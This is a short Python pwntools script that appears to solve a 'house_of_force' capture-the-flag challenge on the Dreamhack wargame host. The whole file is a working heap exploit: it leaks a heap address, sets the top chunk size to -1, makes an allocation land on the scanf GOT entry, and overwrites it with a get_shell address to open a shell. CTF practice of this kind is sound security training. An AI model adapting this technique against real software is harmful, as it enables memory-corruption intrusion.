#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_force")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 9362)

    return r


def main():
    r = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", b"4")
    r.sendafter(b"Data: ", b"AAAA")
    leak = r.recvuntil(b":")[:-1]
    
    top_chunk = int(leak, 16) + 8
    scanf_got = exe.got["__isoc99_scanf"]

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"ptr idx: ", b"0")
    r.sendlineafter(b"write idx: ", b"3")
    r.sendlineafter(b"value: ", b"-1")

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", str(scanf_got - top_chunk - 16).encode())
    r.sendafter(b"Data: ", b"AAAA")
    
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", b"4")
    r.sendafter(b"Data: ", p32(exe.symbols["get_shell"]))

    r.interactive()


if __name__ == "__main__":
    main()